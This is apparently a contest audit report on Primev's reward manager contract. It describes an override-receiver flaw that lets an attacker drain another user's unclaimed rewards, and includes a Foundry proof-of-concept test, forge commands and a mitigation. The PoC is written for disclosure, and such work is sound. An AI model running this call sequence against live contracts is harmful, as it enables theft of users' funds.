# Primev Validator Registory

## Contest Summary

Code under review: [2025-05-primev](https://cantina.xyz/competitions/e92be0b9-b4f2-4bf2-9544-ae285fcfc02d) (223 nSLOC)

Contest Page: [primev-contest](https://cantina.xyz/competitions/e92be0b9-b4f2-4bf2-9544-ae285fcfc02d)


## Unclaimed Rewards Drain via `overrideReceiver()` Abuse

Due to a flaw in the auto-migration logic when removing an override receiver, an attacker can manipulate the system to steal unclaimed rewards from arbitrary users.

### Attack Path

1. Assume Alice has 10 ETH in unclaimed rewards.
2. The attacker sets Alice as their `overrideAddress` using `overrideReceiver(alice, migrateExistingRewards = false)`.
3. The attacker then calls `removeOverrideReceiver(migrateExistingRewards = true)`.
4. Due to auto-migration, Alice’s unclaimed rewards are transferred to the attacker’s account, and Alice’s balance becomes zero.
5. The attacker calls `claimRewards()` to collect the 10 ETH.

### Impact

This allows an attacker to steal unclaimed rewards from any user arbitrarily and repeatedly.
**Impact: High**

### Likelihood

The attack is trivial to perform, highly reproducible, and cannot be mitigated without pausing the contract, which would affect all users.
**Likelihood: High**

### Proof-of-Concept

> Add the following test case to `/contracts/test/validator-registry/rewards/RewardManagerTest.sol`.

```solidity
 function test_Attack_UnclaimedRewards() public {
        address attacker = address(0x1234567890);
        address victim = address(0xabcdefabcdef);

        // victim setting his stake in vanilla registry
        vm.deal(victim, 9 ether);
        assertEq(victim.balance, 9 ether);
        bytes[] memory validators = new bytes[](1);
        validators[0] = sampleValPubkey4;
        vm.startPrank(victim);
        vanillaRegistryTest.validatorRegistry().stake{value: 9 ether}(
            validators
        );
        vm.stopPrank();

        // assuring vitcim position in vanilla registry for sampleValPubkey4
        assertTrue(
            vanillaRegistryTest.validatorRegistry().isValidatorOptedIn(
                sampleValPubkey4
            )
        );

        vm.deal(user4, 2 ether);
        vm.prank(user4);
        rewardManager.payProposer{value: 2 ether}(sampleValPubkey4);

        // assuring victim have eth in unclaimed rewards
        assertEq(rewardManager.unclaimedRewards(victim), 2 ether);

        //attacker balance before attack
        assertEq(attacker.balance, 0 ether);

        vm.startPrank(attacker);
        // attack starts
        rewardManager.overrideReceiver(victim, false);
        rewardManager.removeOverrideAddress(true);
        rewardManager.claimRewards();
        // attack ends
        assertEq(attacker.balance, 2 ether); // attacker got victim's unclaimed rewards
        assertEq(rewardManager.unclaimedRewards(victim), 0 ether); // victim has no unclaimed rewards anymore
    }
```

#### Commands to Generate Test Output

```bash
forge clean
```

```bash
forge test --match-test test_Attack_UnclaimedRewards --via-ir -vvvv
```

### Mitigation

- Avoid automatically migrating rewards when setting an override. Instead, allow the original receiver to claim their rewards and transfer them manually to the override address if desired.
